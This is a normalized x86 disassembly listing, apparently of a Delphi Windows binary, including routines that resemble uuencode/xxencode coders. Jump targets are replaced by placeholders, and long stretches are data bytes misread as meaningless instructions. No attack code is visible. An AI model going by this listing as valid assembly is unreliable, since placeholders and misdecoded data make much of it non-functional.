push 0x0
push 0x0
mov eax ebx
call sub_41b514
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
xor ecx ecx
mov dl 0x1
mov eax [ sub_47f8e8 ]
call sub_47fb00
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4813a1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
jl r-xdata
cmp eax [ ebp - 0x18 ]
jb r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x39
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x30 ]
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_404424
add [ ebp - 0x10 ] 0x39
adc [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
mov edx eax
mov eax esi
pop ecx
call sub_41b758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4813a8
jmp r-xdata
sub_4813d7
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
xor eax eax
push ebp
push sub_481405
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48140c
retn
sub_481410
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ecc4
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_47ec90
mov dl 0x1
mov eax [ r-xdata ]
call sub_48113c
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_47eee4
sub_481461
add [ eax ] al
add [ eax + 0x4814 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
adc al 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
adc al 0x48
add [ eax + 0x7c000000 ] dh
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + ebx + 0x42 ] bh
add al ch
sbb [ eax ] cl
adc [ ecx + ecx * 2 + 0x64 ] edx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax - 0x4fffb7eb ] ch
add [ eax ] al
add [ esp + edx + 0x48 ] ah
push ebp
inc ebp
inc edx
popad
jae r-xdata
add [ eax ] al
add [ eax - 0xe ] ah
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
push ebp
inc ebp
mov eax eax
mov esp 0x7004815
or eax 0x44644954
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
add [ eax + 0x1b ] al
mov eax eax
cld
adc al 0x48
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] ch
pop ss
dec eax
add [ eax ] bh
add [ eax ] al
add ah ah
adc eax 0x21ec0048
inc edx
add [ eax + 0x35 ] bl
inc eax
push ebp
inc ebp
inc edx
popad
jae r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
push ebp
inc ebp
je r-xdata
push ebp
inc ebp
inc edx
popad
jae r-xdata
cmp eax 0x41403f3e
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push ebp
inc ebp
mov eax eax
cmp al 0x17
dec eax
add [ edi ] al
or eax 0x45644954
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax + 0x1b ] al
mov eax eax
jl r-xdata
mov eax eax
xor [ esi ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0x48 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0x48 ] ah
add [ eax ] bh
dec eax
add al bh
adc al 0x48
add [ ebx ] al
add [ edx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
mov al 0x14
dec eax
add [ esp + esi * 8 ] cl
inc edi
add [ ebx ] al
add [ edx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_40416c
mov eax [ esi + 0x30 ]
mov al [ eax ]
mov [ esi + 0x34 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
pop ebx
pop esp
pop ebp
pop esi
pop edi
add [ eax ] al
add [ eax ] al
push ebx
push esi
test dl dl
je r-xdata
push ebp
inc ebp
hlt
push ss
dec eax
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edx + ebx + 0x42 ] bh
add [ eax ] ch
sbb cl [ eax ]
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add ah dh
sbb eax 0x92f40042
push ebp
inc ebp
add [ eax ] al
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add ah bh
pop ss
dec eax
add [ eax + 0x18 ] dl
dec eax
add [ 0x44644954 ] cl
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add ah dh
sbb eax 0x92f40042
push ebp
inc ebp
add [ eax ] al
mov eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x28004817 ] dh
sbb cl [ eax ]
or eax 0x45644954
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add ah dh
sbb eax 0x92f40042
push ebp
inc ebp
add [ eax ] al
mov eax eax
hlt
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
push ebp
inc ebp
inc edx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx + 0x48 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x15
dec eax
add [ eax + 0x64000000 ] dh
adc al 0x48
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
dec eax
add [ ebx + esi * 8 ] al
inc edi
add [ eax + eax ] al
or cl [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
xor [ esi ] dl
sub_4816ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x17
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
pop ss
dec eax
add [ eax ] bh
add [ eax ] al
add ah ah
adc eax 0x21ec0048
inc edx
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
sbb al [ edx ]
fcom [ ebx + 0x1df40041 ]
inc edx
add ah dh
xchg edx eax
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + 0x28004817 ] dh
sbb cl [ eax ]
or eax 0x45644954
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
cmp eax 0x41403f3e
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push ebp
inc ebp
mov eax eax
cmp al 0x17
dec eax
add [ edi ] al
or eax 0x45644954
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
lea eax [ esi + 0x30 ]
mov edx [ rw-data ]
call sub_40416c
mov eax [ esi + 0x30 ]
mov al [ eax ]
mov [ esi + 0x34 ] al
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
pop ebx
pop esp
pop ebp
pop esi
pop edi
add [ eax ] al
add [ eax ] al
push ebx
push esi
test dl dl
je r-xdata
push ebp
inc ebp
hlt
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4817fc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x7e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_481850
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4818bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d17c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_4818e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4818c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_4818e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_481a1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481a21
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx esi [ ebx + eax + 0x2f ]
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
mov eax esi
mov ecx 0x3
cdq
idiv ecx
sub edx 0x1
jb r-xdata
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
lea eax [ ebp - 0x4 ]
call sub_404764
jmp r-xdata
je r-xdata
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47f49c
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
add edx 0x4
lea eax [ ebp - 0x4 ]
call sub_404764
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x2 ] dl
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x1 ] dl
jmp r-xdata
dec edx
je r-xdata
mov eax esi
mov ecx 0x3
cdq
idiv ecx
mov edx eax
shl edx 0x2
add edx 0x4
lea eax [ ebp - 0x4 ]
call sub_404764
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov esi eax
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
mov dl [ ebx + 0xaf ]
mov [ eax + esi - 0x1 ] dl
jmp r-xdata
sub_481a28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_481ab2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_41b4f4
mov [ ebp - 0x8 ] eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_47f68c
mov eax esi
call sub_41b4f4
push edx
push eax
mov eax [ ebp - 0x8 ]
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
add eax 0x1
adc edx 0x0
mov edx [ ebx + 0x30 ]
mov dl [ edx + eax - 0x1 ]
lea eax [ ebp - 0xc ]
call sub_404300
mov edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax edi
call sub_404424
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481ab9
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_481ac4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_481af5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481afc
retn
mov eax rw-data
call sub_404118
sub_481d30
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421a7c
push esi
lea edi [ esi + 0x30 ]
mov esi rw-data
mov ecx 0x1f
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop esi
mov [ esi + 0xaf ] 0x7e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_481d84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_481db5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481dbc
retn
mov eax rw-data
call sub_404118
sub_481de0
sub al 0x1e
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
mov ah 0x32
inc eax
add al dl
xor al [ eax ]
sub ch ch
inc edi
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add ah ah
in al dx
inc edi
add [ eax ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ eax + 0x22 ] dh
dec eax
add [ eax - 0x13 ] ah
inc edi
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
jae r-xdata
dec eax
add [ eax ] bh
add [ eax ] al
call 0xffffffffec4865f4
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] ch
in eax dx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add ah bl
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x1f
push ebp
inc ebp
lea eax [ eax ]
mov [ esi ] ds
dec eax
add [ edi ] al
adc al 0x54
dec ecx
dec ebp
jae r-xdata
add [ eax ] bh
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax - 0x11 ] bh
inc edi
add [ eax ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ eax ] ah
and al 0x48
add [ eax ] bl
push esp
dec ecx
dec ebp
jae r-xdata
mov ah 0x32
inc eax
add al dl
xor al [ eax ]
mov eax 0xd8004752
outsb
outsw
push ebp
push ebp
inc ebp
lea eax [ eax ]
jl r-xdata
inc eax
add [ eax + 0x21 ] ah
dec eax
add ah al
or al 0x33
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
dec eax
add ah ch
and [ edx ] eax
pop eax
mov esp 0x4820
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x78004820 ] ah
push ebp
inc ebp
inc edx
popad
jae r-xdata
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
pop ds
dec eax
add [ eax + eax ] dh
add [ eax - 0x13ffb817 ] ah
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffb8ae ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
pop ds
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0x740048 ] bh
add [ eax ] al
mov al [ 0xffffffffec0047e9 ]
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
xor eax 0x35600040
push ebp
inc ebp
sub al 0x1e
dec eax
add [ eax + ebp * 8 + 0x30047 ] bl
adc [ ecx + 0x64 ] ecx
dec ebp
jae r-xdata
dec [ ebx + 0x5cbaf445 ]
and cl [ eax ]
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] ecx
or [ eax ] al
add [ eax ] al
shr dl 0x1
inc edi
push ebp
inc ebp
lea eax [ eax ]
mov esp 0x7004820
adc al 0x54
dec ecx
dec ebp
jae r-xdata
add [ eax ] al
xor [ edi ] bl
lea eax [ eax ]
fcomp [ edi ]
dec eax
add [ edi ] al
sbb [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
jae r-xdata
dec ecx
popad
inc ebx
outsd
jb r-xdata
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x1
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_404524
jne r-xdata
call sub_408248
test al al
je r-xdata
clc
xor edx edx
call sub_408684
mov ebx eax
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0xc ]
mov edx r-xdata
outsb
outsw
push ebp
push ebp
inc ebp
lea eax [ eax ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_482245
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x3
mov edx 0x7
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x8 ]
inc eax
add al ah
and ecx [ eax ]
pushfd
or al 0x33
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
inc eax
shl [ edx ] 0x1
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
in al dx
inc edi
add [ eax ] bl
push esp
dec ecx
dec ebp
jae r-xdata
dec eax
add [ eax + eax ] al
add [ eax ] al
shr al 0x1
inc edi
push ebp
inc ebp
add [ eax ] al
or al 0x1f
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx ] dl
test ebx ebx
jle r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
xor eax 0x35600040
push ebp
inc ebp
pushad
and [ eax ] cl
fcomp [ edi ]
dec eax
add [ 0x64491100 ] al
dec ebp
jae r-xdata
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
push ebp
inc ebp
inc edx
popad
jae r-xdata
mov ecx esi
mov dl 0x1
mov eax [ sub_481de0 ]
call sub_47ece4
mov ebx eax
mov esi ebx
lea eax [ esi + 0x68 ]
push eax
mov ecx 0x7fffffff
mov edx 0xb
mov eax [ ebp - 0x4 ]
call sub_404638
mov [ esi + 0x70 ] 0x2
jmp r-xdata
dec ecx
popad
inc ebx
outsd
jb r-xdata
add [ eax - 0x27ffb8ae ] bh
xchg ebx eax
inc ecx
add ah dh
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48224c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40413c
retn
in eax dx
inc edi
add [ eax ] bl
push esp
dec ecx
dec ebp
jae r-xdata
push ebp
inc ebp
add [ eax ] al
cmp al 0x21
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x48 ] al
add [ eax ] cl
add [ eax ] al
add al dl
0x354c0047 0x40
add [ eax ] al
add [ eax ] dh
pop ds
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x48 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x78004820 ]
dec eax
add [ eax - 0x16 ] dl
inc edi
add [ 0x64491100 ] al
dec ebp
jae r-xdata
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add al ah
and eax 0x54000048
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ eax ] ah
and al 0x48
add [ esp + edx * 2 ] dl
dec ecx
dec ebp
jae r-xdata
popad
inc ebx
outsd
jb r-xdata
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
push ebp
inc ebp
add [ eax ] al
pushad
and [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_482267
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4823c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
xor eax eax
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47ed64
mov eax [ ebp - 0x10 ]
call sub_4043d8
test eax eax
jle r-xdata
xor eax eax
push ebp
push sub_48239e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov al [ eax ]
sub al 0x4d
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_47ed64
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_408280
mov eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov dl [ edx + 0xaf ]
call sub_404300
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_404524
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4817fc
mov [ ebp - 0xc ] eax
jmp r-xdata
sub al 0x1b
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_408280
mov eax [ ebp - 0x18 ]
call sub_4043d8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4823a5
lea eax [ ebp - 0xc ]
call sub_40d814
retn
mov ecx esi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0x30 ]
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_481d30
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_4823e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47ed7c
mov eax [ r-xdata ]
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_482420
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_48259e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax ebx
call sub_41b514
push r-xdata
lea edx [ ebp - 0xc ]
mov eax [ edi + 0x6c ]
call sub_40850c
push [ ebp - 0xc ]
push r-xdata
push [ edi + 0x68 ]
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x5
call sub_404498
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
lea eax [ ebp - 0x4 ]
call j_sub_4045e4
mov edx eax
mov eax esi
pop ecx
call sub_41b758
mov eax [ edi + 0x70 ]
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_482574
push [ fs : eax ]
mov [ fs : eax ] esp
